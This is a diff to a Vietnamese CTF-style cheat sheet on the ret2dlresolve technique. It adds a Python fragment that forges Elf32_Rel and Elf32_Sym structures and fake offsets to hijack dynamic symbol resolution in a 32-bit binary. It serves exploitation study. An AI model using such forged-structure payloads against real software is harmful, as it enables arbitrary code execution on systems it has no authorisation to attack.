@@ -158,6 +158,32 @@ _dl_runtime_resolve(link_map, rel_offset) {
 
 Để khai thác cần tính toán, lựa chọn vị trí và align phức tạp nữa nên một lần nữa tôi nhấn mạnh đây chỉ giống như `cheat sheet` => đọc và làm ví dụ từ writeup `0ctf - babystack` tôi để link trong mẫu 32 bit.
 
+```python
+# Compute offsets and forged structures
+forged_ara = buf + 0x14				                  # buffer2 contain struct from buf + 0x14
+
+# fake rel_offser argument `_dl_runtime_resolve`
+rel_offset = forged_ara - JMPREL		
+elf32_sym = forged_ara + 0x8	                     # size of elf32_sym
+
+align = 0x10 - ((elf32_sym - SYMTAB) % 0x10) 	   # align to 0x10
+elf32_sym = elf32_sym + align
+
+# fake rel_entry->r_info 
+index_sym = (elf32_sym - SYMTAB) // 0x10
+r_info = (index_sym << 8) | 0x7
+
+# fake st_name (sym_entry->st_name)
+st_name = (elf32_sym + 0x10) - STRTAB
+
+# fake struct "Elf32_Rel *rel_entry"
+fake_rel_struct = p32(elf.got["read"]) + p32(r_info)
+
+# fake struct "Elf32_Sym *sym_entry"
+fake_sym_struct = p32(st_name) + p32(0) 
+fake_sym_struct += p32(0) + p32(0x12)
+```
+
 ---------------------------------------------------
 
 ### Reference Source:
